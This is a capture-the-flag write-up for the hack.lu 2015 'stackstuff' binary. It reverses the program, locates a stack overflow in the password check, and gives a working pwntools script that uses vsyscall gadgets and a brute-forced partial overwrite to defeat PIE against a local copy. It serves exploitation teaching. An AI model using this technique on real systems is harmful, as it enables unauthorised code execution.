# hacklu 2015 stackstuff

The goal of this challenge is to read the contents of the `flag` file.

Let's take a look at the binary:

```
$    file stackstuff
stackstuff: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f46fbf9b159f6a1a31893faf7f771ca186a2ce8d, not stripped
$    pwn checksec stackstuff
[*] '/Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
$    /stackstuff
15935728
```

So we are dealing with a `64` bit binary, with NX and PIE. When we run it, it doesn't appear to do anything. However when we check netstat as we run it, we see that it binds to a port:

```
$    netstat -planet

.    .    .
 
tcp6       0      0 :::1514                 :::*                    LISTEN      1000       86812      5920/./stackstuff      
```

## Reversing

When we take a look at the main function in Ghidra, we see this:

```

/* WARNING: Could not reconcile some variable overlaps */

undefined8 main(undefined8 uParm1,char **ppcParm2)

{
  uint16_t uVar1;
  int iVar2;
  uint uVar3;
  undefined4 local_3c;
  ulong local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined4 local_20;
  int local_14;
  int local_10;
  int local_c;
 
  iVar2 = strcmp(*ppcParm2,"reexec");
  if (iVar2 == 0) {
    handle_request();
  }
  else {
    uVar3 = socket(10,1,0);
    local_c = negchke((ulong)uVar3,"unable to create socket");
    local_30 = 0;
    local_28 = 0;
    local_20 = 0;
    local_38 = 10;
    uVar1 = htons(0x5ea);
    local_38._0_4_ = CONCAT22(uVar1,(sa_family_t)local_38);
    local_38 = local_38 & 0xffffffff00000000 | (ulong)(uint)local_38;
    local_3c = 1;
    uVar3 = setsockopt(local_c,1,2,&local_3c,4);
    negchke((ulong)uVar3,"unable to set SO_REUSEADDR");
    uVar3 = bind(local_c,(sockaddr *)&local_38,0x1c);
    negchke((ulong)uVar3,"unable to bind");
    uVar3 = listen(local_c,0x10);
    negchke((ulong)uVar3,"unable to listen");
    signal(0x11,(__sighandler_t)0x1);
    while( true ) {
      uVar3 = accept(local_c,(sockaddr *)0x0,(socklen_t *)0x0);
      local_10 = negchke((ulong)uVar3,"unable to accept");
      uVar3 = fork();
      local_14 = negchke((ulong)uVar3,"unable to fork");
      if (local_14 == 0) break;
      close(local_10);
    }
    close(local_c);
    uVar3 = dup2(local_10,0);
    negchke((ulong)uVar3,"unable to dup2");
    uVar3 = dup2(local_10,1);
    negchke((ulong)uVar3,"unable to dup2");
    close(local_10);
    uVar3 = execl("/proc/self/exe","reexec",0);
    negchke((ulong)uVar3,"unable to reexec");
  }
  return 0;
}
```

So we see here is where it handles the logic of listening on a port, and forking a child process to handle the request. We can see that `handle_request` is the function responsible for handling requests:

```
void handle_request(void)

{
  FILE *passwordHandle;
  char *passwordBytesRead;
  FILE *flagHandle;
  char *bytesRead;
  char flagContents [64];
  FILE *flagFile;
 
  alarm(0x3c);
  setbuf(stdout,(char *)0x0);
  passwordHandle = fopen("password","r");
  if (passwordHandle != (FILE *)0x0) {
    passwordBytesRead = fgets(real_password,0x32,passwordHandle);
    if (passwordBytesRead != (char *)0x0) {
      fclose(passwordHandle);
      puts("Hi! This is the flag download service.");
      require_auth();
      flagHandle = fopen("flag","r");
      if (flagHandle != (FILE *)0x0) {
        bytesRead = fgets(flagContents,0x32,flagHandle);
        if (bytesRead != (char *)0x0) {
          puts(flagContents);
          return;
        }
      }
      fwrite("unable to read flag\n",1,0x14,stderr);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  }
  fwrite("unable to read real_password\n",1,0x1d,stderr);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

So we can see that it tries to open up the files `password` and `flag` (so we will need to make them and have them in the same directory as the elf). Proceeding that it runs the `require_auth` function, which does this:

```
void require_auth(void)

{
  int isPasswordCorrect;
 
  while( true ) {
    isPasswordCorrect = check_password_correct();
    if (isPasswordCorrect != 0) break;
    puts("bad password, try again");
  }
  return;
}
```

We can see that the `require_auth` function just runs an infinite loop, which checks to see if the output of `check_password_correct` is not equal to zero (which would signify we have the correct password). If we are the hit the part of `handle_request` that prints the flag, we have to break out of the loop. When we take a look at `check_password_correct`, we see this:

```

ulong check_password_correct(void)

{
  int iVar1;
  size_t bytesRead;
  long lVar2;
  undefined8 *puVar3;
  int passwordLength;
  undefined8 passwordInput [9];
 
  lVar2 = 6;
  puVar3 = passwordInput;
  while (lVar2 != 0) {
    lVar2 = lVar2 + -1;
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  puts("To download the flag, you need to specify a password.");
  printf("Length of password: ");
  passwordLength = 0;
  iVar1 = __isoc99_scanf(&DAT_001013e3,&passwordLength);
  if (iVar1 != 1) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if ((passwordLength < 1) || (0x32 < passwordLength)) {
    passwordLength = 0x5a;
  }
  bytesRead = fread(passwordInput,1,(long)passwordLength,stdin);
  if (bytesRead != (long)passwordLength) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar1 = strcmp((char *)passwordInput,real_password);
  return (ulong)(iVar1 == 0);
}
```

So we can see here, it essentially prompts us for a password length, then scans in that much data into `passwordInput`. We can see that this is clearly a buffer overflow bug. However there are a few obstacles we need to consider. First it checks to see if the bytes it scanned in is equal to the length we provided. In addition to that if the length we provide is less than `1` or greater than `0x32`, our length is set to `0x5a`. If it doesn't pass the length check the `exit` function is called and we don't get code execution.

Let's see what the distance is between the start of our input and the return address is. First we set the breakpoint and specify to follow the child process on fork in gdb:

```
gef➤  set follow-fork-mode child
gef➤  r
Starting program: /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
[Attaching after process 6338 fork to child process 6345]
[New inferior 2 (process 6345)]
[Detaching after fork from parent process 6338]
[Inferior 1 (process 6338) detached]
process 6345 is executing new program: /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
[Switching to process 6345]
```

Then we give our input via netcat:

```
$    nc 127.0.0.1 1514
Hi! This is the flag download service.
To download the flag, you need to specify a password.
Length of password: 8
15935728
```

And then we hit our breakpoint in gdb:

```
Thread 2.1 "exe" hit Breakpoint 1, 0x0000555555554f7e in check_password_correct ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x8               
$rbx   : 0x0               
$rcx   : 0x3832373533393531 ("15935728"?)
$rdx   : 0x8               
$rsp   : 0x00007fffffffde90  →  0x0000000000000000
$rbp   : 0x0000555555555310  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007ffff7fb3590  →  0x0000000000000000
$rdi   : 0x00007fffffffdea0  →  "15935728"
$rip   : 0x0000555555554f7e  →  <check_password_correct+172> mov rdx, rax
$r8    : 0xc00             
$r9    : 0x00007ffff7fb0a00  →  0x00000000fbad2088
$r10   : 0x3               
$r11   : 0x00007ffff7e4e8a0  →  <fread+0> push r14
$r12   : 0x0000555555554d70  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe090  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde90│+0x0000: 0x0000000000000000     ← $rsp
0x00007fffffffde98│+0x0008: 0x00000008f7e5c0f3
0x00007fffffffdea0│+0x0010: "15935728"     ← $rdi
0x00007fffffffdea8│+0x0018: 0x0000000000000000
0x00007fffffffdeb0│+0x0020: 0x0000000000000000
0x00007fffffffdeb8│+0x0028: 0x0000000000000000
0x00007fffffffdec0│+0x0030: 0x0000000000000000
0x00007fffffffdec8│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555554f70 <check_password_correct+158> adc    BYTE PTR [rsi+0x1], bh
   0x555555554f76 <check_password_correct+164> mov    rdi, rax
   0x555555554f79 <check_password_correct+167> call   0x555555554bd0 <fread@plt>
 → 0x555555554f7e <check_password_correct+172> mov    rdx, rax
   0x555555554f81 <check_password_correct+175> mov    eax, DWORD PTR [rsp+0xc]
   0x555555554f85 <check_password_correct+179> cdqe   
   0x555555554f87 <check_password_correct+181> cmp    rdx, rax
   0x555555554f8a <check_password_correct+184> je     0x555555554f96 <check_password_correct+196>
   0x555555554f8c <check_password_correct+186> mov    edi, 0x0
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "exe", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555554f7e → check_password_correct()
[#1] 0x555555554fd1 → require_auth()
[#2] 0x55555555508b → handle_request()
[#3] 0x55555555512d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  i f
Stack level 0, frame at 0x7fffffffdef0:
 rip = 0x555555554f7e in check_password_correct; saved rip = 0x555555554fd1
 called by frame at 0x7fffffffdf00
 Arglist at 0x7fffffffde88, args:
 Locals at 0x7fffffffde88, Previous frame's sp is 0x7fffffffdef0
 Saved registers:
  rip at 0x7fffffffdee8
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[heap]'(0x555555756000-0x555555777000), permission=rw-
  0x555555756490 - 0x555555756498  →   "15935728"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdea0 - 0x7fffffffdea8  →   "15935728"
gef➤  x/4g 0x7fffffffdee8
0x7fffffffdee8:    0x555555554fd1    0x0
0x7fffffffdef8:    0x55555555508b    0x2
```

So we can see that the offset is `0x7fffffffdee8 - 0x7fffffffdea0 = 0x48`. Since this is above `0x32` and the length check, that means we have to give `0x5a` bytes worth of input. That means with our overflow we will have to overwrite the saved return address, the next qword, and the two lowest bytes of the next address (in this case the address at `0x7fffffffdef8`).

## Exploitation

So for our exploit, we will be doing a partial overwrite. We will be doing this to bypass PIE's address randomization, however there will be abit of brute forcing needed (we will cover that later). However before we do that, we will be doing an overwrite of the saved return address and the QWORD next to it. For that we will need to find a valid instruction pointer to place there, which will essentially just return, and act as a placeholder to execute the address which we partially overwrote. However the problem with this is that PIE is enabled, and since we don't have any infoleaks we can't call rop gadgets from the PIE or libc segments. This is where vsyscalls will come in handy:

```
ef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gef➤  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gef➤  x/4i 0xffffffffff600800
   0xffffffffff600800:    mov    rax,0x135
   0xffffffffff600807:    syscall
   0xffffffffff600809:    ret    
   0xffffffffff60080a:    int3
gef➤  x/4i 0xffffffffff600800
   0xffffffffff600800:    mov    rax,0x135
   0xffffffffff600807:    syscall
   0xffffffffff600809:    ret    
   0xffffffffff60080a:    int3
```

The purpose of vsyscalls is to increase performance by offloading certain syscalls to the userspace binary, however they are still a part of the kernel. The beneficial part of vsyscalls is that their addresses are fixed and aren't randomized. As a result, we don't need an infoleak to call them. For which one to call, I just went with `0xffffffffff600800`. I initially tried jumping straight to a `ret` instruction, however it would crash after the second gadget. So I tried jumping to the start of a syscall and it worked. If we place that rop gadget twice as the saved return address and the next QWORD, that will bring the code execution right to the address we partially overwrote.

Now for the partial overwrite. We can see that the address that we are going to be overwritten is going to be `0x000055555555508b` which is `handle_request+177`:

```
gef➤  x/4g 0x7fffffffdee8
0x7fffffffdee8:    0x0000555555554fd1    0x0000000000000000
0x7fffffffdef8:    0x000055555555508b    0x0000000000000002
gef➤  x/i 0x000055555555508b
   0x55555555508b <handle_request+177>:    lea    rsi,[rip+0x36d]        # 0x5555555553ff
```

Since if we were to reach that spot in the code we will get the flag, we will be overwriting it to be the same address. However there is one complication. That is that the base address is `0x0000555555554000`. This means that the randomization doesn't apply to the last `12` bits (since they are zeroed out, and the address is the base address plus the offset, the address will just be whatever the offset is). However since we need to overwrite the 16 least significant bits, we will have to brute force 4 of those bits. Since 2 to the power of 4 is 16, we should be able to guess the address in at most `16` tries.

Also one small thing, while debugging this program, you may need to view the pid and kill it.

## Exploit

Putting it all together, we have the following exploit:

```
from pwn import *

targetProcess = process('./stackstuff')
#gdb.attach(targetProcess)

# Initialize constants
flag = 0
i = 0x00

# Enter into the loop to brute force it
while flag == 0:

    # Establish the connection
    target = remote('127.0.0.1', 1514)

    # Filler from start of our input to return address
    payload = "0"*0x48

    # Our vsyscall gadget to act essentially as a rop nop
    vsyscall_ret = p64(0xffffffffff600800)

    payload += vsyscall_ret*2

    # Our least significant byte of our partial overwrite
    payload += "\x8b"

    # The byte which we will be brute forcing
    payload += chr(i)

    # Specify length of our input to be 90 bytes
    target.sendline('90')

    # Send the payload
    target.sendline(payload)

    target.recvuntil("Length of password: ")
    try:
        # Executes if we got the flag
        print "flag: " + target.recvline()
        flag = 1
    except:
        # Didn't get the flag, try next byte
        # Also we know that the lower 4 bits of this byte is 0x0
        print "tried: " + hex(i)
        i += 0x10
```

When we run it:

```
python exploit.py
[+] Starting local process './stackstuff': pid 13491
[+] Opening connection to 127.0.0.1 on port 1514: Done
tried: 0x0
[+] Opening connection to 127.0.0.1 on port 1514: Done
tried: 0x10
[+] Opening connection to 127.0.0.1 on port 1514: Done
tried: 0x20
[+] Opening connection to 127.0.0.1 on port 1514: Done
tried: 0x30
[+] Opening connection to 127.0.0.1 on port 1514: Done
tried: 0x40
[+] Opening connection to 127.0.0.1 on port 1514: Done
tried: 0x50
[+] Opening connection to 127.0.0.1 on port 1514: Done
flag: flag{g0ttem_b0yz}

[*] Closed connection to 127.0.0.1 port 1514
[*] Closed connection to 127.0.0.1 port 1514
[*] Closed connection to 127.0.0.1 port 1514
[*] Closed connection to 127.0.0.1 port 1514
[*] Closed connection to 127.0.0.1 port 1514
[*] Closed connection to 127.0.0.1 port 1514
[*] Closed connection to 127.0.0.1 port 1514
[*] Stopped process './stackstuff' (pid 13491)
```

Just like that, we got the flag!